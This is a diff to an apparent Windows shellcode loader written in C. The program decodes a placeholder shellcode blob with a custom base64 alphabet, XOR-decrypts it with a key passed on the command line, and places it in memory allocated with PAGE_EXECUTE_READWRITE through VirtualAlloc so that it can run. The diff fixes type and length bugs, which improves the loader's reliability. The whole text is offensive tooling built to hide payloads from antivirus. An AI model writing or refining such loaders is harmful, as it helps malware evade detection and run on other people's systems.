@@ -5,8 +5,7 @@
 #include <string.h>
 static char base64_table[] = "Ag9jCXabcJKLV2345WmnopuvwxYZklMhi78NOPrstTUByz0defDEFGHI16+/QRSq";
 static unsigned char shellcode[] = "your encrypted shellcode";
-void base64_decode(char *input, unsigned char **output) {
-    int len = strlen(input);
+void base64_decode(unsigned char *input, unsigned char **output, int len) {
     if (len % 4 != 0) return;
 
     int output_len = len / 4 * 3;
@@ -30,7 +29,7 @@ void base64_decode(char *input, unsigned char **output) {
     }
 }
 
-void xor_encrypt_decrypt(char *input, char *output, char *key, int len) {
+void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
     int key_length = strlen(key);
     for (int i = 0; i < len; i++) {
         output[i] = input[i] ^ key[i % key_length];
@@ -42,9 +41,10 @@ int main(int argc, char *argv[]) {
     unsigned char *decoded = NULL;
     void *exec_mem = NULL;
     char *key = argv[1];
-    char decrypted[2048];
-    base64_decode(shellcode, &decoded);
-    for(int i = strlen(shellcode)/4*3-1; i>=0 ; i--){
+    unsigned char decrypted[2048];
+    int shellcode_len = sizeof(shellcode) / sizeof(shellcode[0]) - 1;
+    base64_decode(shellcode, &decoded, shellcode_len);
+    for(int i = shellcode_len/4*3-1; i>=0 ; i--){
         if (decoded[i] != '\x00') {
             exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             xor_encrypt_decrypt(decoded, decrypted, key, i + 1);
